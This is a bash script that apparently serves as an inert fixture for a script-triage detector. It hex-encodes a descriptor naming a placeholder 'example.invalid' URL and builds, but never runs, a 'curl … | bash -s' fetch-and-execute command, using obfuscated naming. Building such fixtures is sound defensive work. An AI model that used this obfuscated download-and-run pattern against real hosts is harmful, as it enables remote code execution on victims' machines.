#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_751c5ee8='76:3d:31:7c:73:74:65:70:73:3d:61:63:71:75:69:72:65:5f:72:65:6d:6f:74:65:2c:64:69:73:70:61:74:63:68:5f:70:69:70:65:7c:61:64:61:70:74:65:72:3d:63:75:72:6c:5f:73:74:64:6f:75:74:5f:70:69:70:65:7c:73:74:61:67:65:5f:63:6f:75:6e:74:3d:31:7c:63:61:6d:70:61:69:67:6e:5f:69:64:3d:63:61:6d:70:61:69:67:6e:2d:66:37:31:32:30:37:65:36:66:65:7c:75:72:6c:3d:68:74:74:70:73:3a:2f:2f:66:37:31:32:30:37:65:36:66:65:2e:65:78:61:6d:70:6c:65:2e:69:6e:76:61:6c:69:64:2f:61:65:65:36:37:63:33:61:2e:73:68:7c:75:73:65:72:5f:61:67:65:6e:74:3d:48:75:6e:74:72:65:73:73:4c:61:62:2f:66:37:31:32:30:37:65:36:66:65'

readonly Codec_751c5ee8='hex_colon|identity|'



Load_751c5ee8() {

  EnCoDeD_Bytes=()

  local IFS=':' PaRt

  local -a pieces

  read -r -a pieces <<< "${Material_751c5ee8}"

  for PaRt in "${pieces[@]}"; do EnCoDeD_Bytes+=("$((16#$PaRt))"); done

}



Decode_751c5ee8() {

  DeCoDeD_Bytes=()

  local InDeX

  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do

    DeCoDeD_Bytes+=("${EnCoDeD_Bytes[InDeX]}")

  done

}



Recover_751c5ee8() {

  local -a EnCoDeD_Bytes DeCoDeD_Bytes

  local DeScRiPtOr_Text NeUtRaL PaSs InDeX

  NeUtRaL=$((19 * 7 - 133))

  Load_751c5ee8

  local decode_target=Decode_751c5ee8; "$decode_target"

  DeScRiPtOr_Text=''

  local octal character

  for InDeX in "${!DeCoDeD_Bytes[@]}"; do

    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"

    printf -v character '%b' "\\$octal"

    DeScRiPtOr_Text+="$character"

  done

  printf '%s\n' "$DeScRiPtOr_Text"

}



Inspect_751c5ee8() { local recovered field; local -a fields; recovered="$(Recover_751c5ee8)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }



Plan_751c5ee8() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_751c5ee8)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(curl --fail --silent --show-error "$url")

  local -a interpreter=(bash -s)

  declare -p request_command interpreter

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_751c5ee8; fi

